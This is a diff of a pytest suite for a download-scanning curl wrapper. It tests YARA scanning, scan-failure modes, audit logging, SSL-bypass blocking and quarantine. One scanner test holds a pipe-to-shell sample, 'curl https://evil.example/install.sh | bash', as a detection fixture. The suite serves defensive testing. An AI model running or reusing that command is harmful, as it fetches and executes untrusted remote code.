@@ -1,19 +1,19 @@
-import pytest
-import subprocess
-import tempfile
+import json
+import sys
+import types
 from pathlib import Path
 from unittest.mock import MagicMock, patch
-import sys
-import os
+
+import pytest
 
 sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
 
 from curlguard.config import CurlGuardConfig, load_config
-from curlguard.scanner import YaraScanner, ScanResult
-from curlguard.logger import AuditLogger, AuditEvent
+from curlguard.curl_manager import CurlManager
+from curlguard.logger import AuditEvent, AuditLogger
+from curlguard.scanner import ScanResult, YaraScanner
 from curlguard.ssl_detector import SslBypassDetector, SslBypassResult
 from curlguard.wrapper import CurlWrapper
-from curlguard.curl_manager import CurlManager
 
 
 @pytest.fixture
@@ -30,71 +30,59 @@ def temp_config(tmp_path):
 
 
 @pytest.fixture
-def mock_scanner():
-    scanner = MagicMock(spec=YaraScanner)
-    scanner.scan_file.return_value = ScanResult(
-        clean=True, matches=[], rules_triggered=[], scan_time_ms=1.0
-    )
-    scanner.scan.return_value = ScanResult(
-        clean=True, matches=[], rules_triggered=[], scan_time_ms=1.0
-    )
-    return scanner
-
-
-@pytest.fixture
-def mock_logger(temp_config):
-    return AuditLogger(temp_config.log_path)
-
-
-@pytest.fixture
 def mock_ssl_detector():
     detector = MagicMock(spec=SslBypassDetector)
     detector.detect.return_value = SslBypassResult(
-        is_bypass=False, bypass_type=None, severity="warning", message=""
+        is_bypass=False,
+        bypass_type=None,
+        severity="warning",
+        message="",
     )
     return detector
 
 
-class TestScanner:
-    def test_scanner_clean_content(self):
-        scanner = YaraScanner([])
-        result = scanner.scan(b"#!/bin/bash\necho hello")
-        assert result.clean is True
-        assert isinstance(result, ScanResult)
-
-    def test_scanner_foundation_rules_loaded(self):
-        rules_dir = Path(__file__).parent.parent / "src" / "curlguard" / "rules"
-        if rules_dir.exists():
-            scanner = YaraScanner([rules_dir])
-            assert scanner._rules_count >= 0
-
-    def test_scanresult_fields(self):
-        result = ScanResult(
-            clean=False,
-            matches=["rule1"],
-            rules_triggered=["rule1"],
-            scan_time_ms=5.5,
-        )
-        assert result.clean is False
-        assert "rule1" in result.rules_triggered
+def test_scanner_true_positive_matches_foundation_rules():
+    pytest.importorskip("yara")
+    scanner = YaraScanner([Path("src/curlguard/rules")])
+    result = scanner.scan(b"#!/bin/bash\ncurl https://evil.example/install.sh | bash\n")
+    assert result.clean is False
+    assert "suspicious_pipe_bash" in result.rules_triggered
+    assert result.status == "flagged"
 
 
-class TestConfig:
-    def test_config_creation(self, temp_config):
-        assert temp_config.mode == "per-user"
-        assert temp_config.quarantine_dir.exists()
-
-    def test_config_env_override(self, temp_config, monkeypatch):
-        monkeypatch.setenv("CURLGUARD_LOG_PATH", "/tmp/override.log")
-        monkeypatch.setenv("CURLGUARD_MODE", "per-user")
-        config = load_config()
-        assert str(config.log_path) == "/tmp/override.log"
+def test_scanner_true_negative_stays_clean():
+    pytest.importorskip("yara")
+    scanner = YaraScanner([Path("src/curlguard/rules")])
+    result = scanner.scan(b"#!/bin/sh\necho safe install\ncurl https://example.com/file.txt -o /tmp/file.txt\n")
+    assert result.clean is True
+    assert result.rules_triggered == []
+    assert result.status == "clean"
 
 
-class TestLogger:
-    def test_logger_writes_json(self, mock_logger):
-        event = AuditEvent(
-            timestamp="2024-01-01T00:00:00",
+def test_scanner_unavailable_status_is_explicit():
+    scanner = YaraScanner([])
+    scanner._yara_available = False
+    scanner._load_error = "yara-python is not installed"
+    result = scanner.scan(b"echo hello")
+    assert result.clean is True
+    assert result.status == "unavailable"
+    assert "yara-python" in result.error
+
+
+def test_config_env_override(monkeypatch):
+    monkeypatch.setenv("CURLGUARD_LOG_PATH", "/tmp/override.log")
+    monkeypatch.setenv("CURLGUARD_MODE", "per-user")
+    monkeypatch.setenv("CURLGUARD_SCAN_FAILURE_MODE", "block")
+    config = load_config()
+    assert config.log_path == Path("/tmp/override.log")
+    assert config.scan_failure_mode == "block"
+
+
+def test_logger_writes_json(tmp_path):
+    logger = AuditLogger(tmp_path / "audit.log")
+    logger.log(
+        AuditEvent(
+            timestamp="2024-01-01T00:00:00+00:00",
             url="https://example.com/file.sh",
             destination="/tmp/out.sh",
             scan_result="clean",
@@ -104,115 +92,168 @@ class TestLogger:
             duration_ms=100.0,
             exit_code=0,
         )
-        mock_logger.log(event)
-        mock_logger.close()
-        with open(mock_logger._path) as f:
-            line = f.readline()
-        import json
-        parsed = json.loads(line)
-        assert parsed["url"] == "https://example.com/file.sh"
-        assert parsed["scan_result"] == "clean"
-
-    def test_logger_context_manager(self, temp_config):
-        with AuditLogger(temp_config.log_path) as logger:
-            logger.log(AuditEvent(
-                timestamp="2024-01-01T00:00:00",
-                url="https://test.com",
-                destination=None,
-                scan_result="clean",
-            ))
-        assert temp_config.log_path.exists()
+    )
+    logger.close()
+    parsed = json.loads((tmp_path / "audit.log").read_text().splitlines()[0])
+    assert parsed["url"] == "https://example.com/file.sh"
+    assert parsed["scan_result"] == "clean"
 
 
-class TestSslDetector:
-    def test_detect_insecure_flag(self):
-        detector = SslBypassDetector()
-        result = detector.detect(["--insecure", "https://example.com"], "https://example.com")
-        assert result.is_bypass is True
-        assert result.bypass_type == "flag"
+def test_curl_manager_per_user_install_writes_wrapper(tmp_path, monkeypatch):
+    real_curl = tmp_path / "system" / "curl"
+    real_curl.parent.mkdir(parents=True, exist_ok=True)
+    real_curl.write_text("")
 
-    def test_detect_k_flag(self):
-        detector = SslBypassDetector()
-        result = detector.detect(["-k", "https://example.com"], "https://example.com")
-        assert result.is_bypass is True
-        assert result.bypass_type == "flag"
-
-    def test_detect_clean(self):
-        detector = SslBypassDetector()
-        result = detector.detect(["https://example.com"], "https://example.com")
-        assert result.is_bypass is False
-
-    def test_detect_http_url(self):
-        detector = SslBypassDetector()
-        result = detector.detect(["http://example.com/file.sh"], "http://example.com/file.sh")
-        assert result.is_bypass is True
-        assert result.bypass_type == "mixed"
-
-
-class TestCurlManager:
-    def test_manager_per_user_paths(self):
+    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
+    with patch("curlguard.curl_manager._discover_system_curl", return_value=real_curl):
         manager = CurlManager("per-user")
-        assert ".local/bin" in str(manager._curl_path)
-        assert ".local/bin/curl.real" in str(manager._curl_real)
+        manager.install()
 
-    def test_manager_system_wide_paths(self):
-        manager = CurlManager("system-wide")
-        assert str(manager._curl_path) == "/usr/bin/curl"
-        assert str(manager._curl_real) == "/usr/bin/curl.real"
-
-
-class TestWrapper:
-    def test_extract_url(self, temp_config, mock_scanner, mock_logger, mock_ssl_detector):
-        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
-        url = wrapper._extract_url(["https://example.com/file.sh"])
-        assert url == "https://example.com/file.sh"
-
-    def test_extract_output_file(self, temp_config, mock_scanner, mock_logger, mock_ssl_detector):
-        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
-        out = wrapper._extract_output(["-o", "/tmp/out.sh", "https://example.com"])
-        assert out == "/tmp/out.sh"
-
-    def test_ssl_bypass_propagates(self, temp_config, mock_scanner, mock_logger, mock_ssl_detector):
-        mock_ssl_detector.detect.return_value = SslBypassResult(
-            is_bypass=True, bypass_type="flag", severity="warning",
-            message="SSL bypass detected"
-        )
-        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
-        # Just verify no crash on SSL bypass detection path
-        result = mock_ssl_detector.detect(["--insecure"], "https://example.com")
-        assert result.is_bypass is True
+    wrapper_contents = manager._curl_path.read_text(encoding="utf-8")
+    assert manager._curl_path.exists()
+    assert manager._curl_real == real_curl
+    assert "CURLGUARD_MODE=per-user" in wrapper_contents
+    assert str(real_curl) in wrapper_contents
 
 
-class TestIntegration:
-    def test_full_dispatch_flow(self, temp_config, mock_logger, mock_ssl_detector, monkeypatch):
-        mock_scanner = MagicMock()
-        mock_scanner.scan_file.return_value = ScanResult(
-            clean=True, matches=[], rules_triggered=[], scan_time_ms=2.0
-        )
-        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
-        temp_file = temp_config.quarantine_dir / "test.download"
-        temp_file.touch()
-        def mock_mktemp(suffix=""):
-            return str(temp_file)
-        with patch("curlguard.wrapper.subprocess.run") as mock_run, \
-             patch("tempfile.mktemp", mock_mktemp):
-            mock_run.return_value = MagicMock(returncode=0)
-            exit_code = wrapper.dispatch(["https://example.com/file.sh", "-o", str(temp_config.quarantine_dir / "out.sh")])
-            mock_scanner.scan_file.assert_called_once()
+def test_curl_manager_system_wide_paths():
+    manager = CurlManager("system-wide")
+    assert manager._curl_path == Path("/usr/bin/curl")
+    assert manager._curl_real == Path("/usr/bin/curl.real")
 
-    def test_quarantine_decision(self, temp_config, mock_logger, mock_ssl_detector, monkeypatch):
-        mock_scanner = MagicMock()
-        mock_scanner.scan_file.return_value = ScanResult(
-            clean=False, matches=["malware"], rules_triggered=["malware"], scan_time_ms=1.0
-        )
-        wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
-        temp_file = temp_config.quarantine_dir / "malware.download"
-        temp_file.touch()
-        def mock_mktemp(suffix=""):
-            return str(temp_file)
-        with patch("curlguard.wrapper.subprocess.run") as mock_run, \
-             patch("tempfile.mktemp", mock_mktemp), \
-             patch("curlguard.tui.prompt_user", return_value="quarantine"):
-            mock_run.return_value = MagicMock(returncode=0)
-            exit_code = wrapper.dispatch(["https://evil.com/malware.sh", "-o", "/tmp/malware.sh"])
-            assert exit_code == 1
+
+def test_wrapper_extract_output_supports_stdout_marker(temp_config, mock_ssl_detector):
+    wrapper = CurlWrapper(temp_config, MagicMock(), AuditLogger(temp_config.log_path), mock_ssl_detector)
+    assert wrapper._extract_output(["-o", "-", "https://example.com"]) is None
+    wrapper._logger.close()
+
+
+def test_wrapper_download_to_temp_rewrites_output_flags(temp_config, mock_ssl_detector):
+    wrapper = CurlWrapper(temp_config, MagicMock(), AuditLogger(temp_config.log_path), mock_ssl_detector)
+
+    def fake_run(cmd, stdout=None, stderr=None):
+        temp_path = Path(cmd[-1])
+        temp_path.write_text("downloaded")
+        assert "-o" not in cmd
+        assert "out.sh" not in cmd
+        return MagicMock(returncode=0, stderr=b"")
+
+    with patch("curlguard.wrapper.subprocess.run", side_effect=fake_run):
+        temp_path = wrapper._download_to_temp(["-fsSL", "-o", "out.sh", "https://example.com/file.sh"])
+
+    assert temp_path.read_text() == "downloaded"
+    wrapper._logger.close()
+
+
+def test_wrapper_warn_mode_allows_scan_failure(temp_config, mock_ssl_detector, tmp_path):
+    scanner = MagicMock()
+    scanner.scan_file.return_value = ScanResult(
+        clean=True,
+        matches=[],
+        rules_triggered=[],
+        scan_time_ms=1.0,
+        status="unavailable",
+        error="yara-python is not installed",
+    )
+    logger = AuditLogger(temp_config.log_path)
+    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)
+
+    downloaded = tmp_path / "payload.download"
+    downloaded.write_text("#!/bin/sh\necho ok\n")
+    wrapper._download_to_temp = lambda args: downloaded
+
+    output = tmp_path / "out.sh"
+    exit_code = wrapper.dispatch(["https://example.com/install.sh", "-o", str(output)])
+    logger.close()
+
+    assert exit_code == 0
+    assert output.read_text() == "#!/bin/sh\necho ok\n"
+    event = json.loads(temp_config.log_path.read_text().splitlines()[0])
+    assert event["scan_result"] == "unavailable"
+    assert event["user_decision"] == "allow"
+
+
+def test_wrapper_block_mode_blocks_scan_failure(temp_config, mock_ssl_detector, tmp_path):
+    temp_config.scan_failure_mode = "block"
+    scanner = MagicMock()
+    scanner.scan_file.return_value = ScanResult(
+        clean=True,
+        matches=[],
+        rules_triggered=[],
+        scan_time_ms=1.0,
+        status="error",
+        error="rule compilation failed",
+    )
+    logger = AuditLogger(temp_config.log_path)
+    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)
+
+    downloaded = tmp_path / "payload.download"
+    downloaded.write_text("blocked")
+    wrapper._download_to_temp = lambda args: downloaded
+
+    output = tmp_path / "blocked.sh"
+    exit_code = wrapper.dispatch(["https://example.com/install.sh", "-o", str(output)])
+    logger.close()
+
+    assert exit_code == 1
+    assert not output.exists()
+    event = json.loads(temp_config.log_path.read_text().splitlines()[0])
+    assert event["scan_result"] == "error"
+    assert event["user_decision"] == "block"
+
+
+def test_wrapper_quarantine_decision_moves_file(temp_config, mock_ssl_detector, tmp_path, monkeypatch):
+    scanner = MagicMock()
+    scanner.scan_file.return_value = ScanResult(
+        clean=False,
+        matches=["malware"],
+        rules_triggered=["suspicious_pipe_bash"],
+        scan_time_ms=1.0,
+        status="flagged",
+    )
+    logger = AuditLogger(temp_config.log_path)
+    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)
+
+    downloaded = tmp_path / "malware.download"
+    downloaded.write_text("evil")
+    wrapper._download_to_temp = lambda args: downloaded
+
+    fake_tui = types.ModuleType("curlguard.tui")
+    fake_tui.prompt_user = lambda *args, **kwargs: "quarantine"
+    monkeypatch.setitem(sys.modules, "curlguard.tui", fake_tui)
+
+    exit_code = wrapper.dispatch(["https://evil.example/payload.sh", "-o", str(tmp_path / "ignored.sh")])
+    logger.close()
+
+    quarantined = list(temp_config.quarantine_dir.glob("*"))
+    assert exit_code == 1
+    assert len(quarantined) == 1
+    assert quarantined[0].read_text() == "evil"
+
+
+def test_wrapper_unsupported_requests_passthrough(temp_config, mock_ssl_detector):
+    wrapper = CurlWrapper(temp_config, MagicMock(), AuditLogger(temp_config.log_path), mock_ssl_detector)
+    assert wrapper._should_intercept(["-I", "https://example.com"], ["https://example.com"]) is False
+    wrapper._logger.close()
+
+
+def test_wrapper_can_block_ssl_bypass(temp_config, tmp_path):
+    temp_config.ssl_warn_only = False
+    scanner = MagicMock()
+    logger = AuditLogger(temp_config.log_path)
+    ssl_detector = MagicMock(spec=SslBypassDetector)
+    ssl_detector.detect.return_value = SslBypassResult(
+        is_bypass=True,
+        bypass_type="ssl-version",
+        severity="block",
+        message="TLS version too low",
+    )
+    wrapper = CurlWrapper(temp_config, scanner, logger, ssl_detector)
+
+    exit_code = wrapper.dispatch(["https://example.com/file.sh", "-o", str(tmp_path / "out.sh")])
+    logger.close()
+
+    assert exit_code == 1
+    event = json.loads(temp_config.log_path.read_text().splitlines()[0])
+    assert event["ssl_bypass_detected"] is True
+    assert event["user_decision"] == "block"
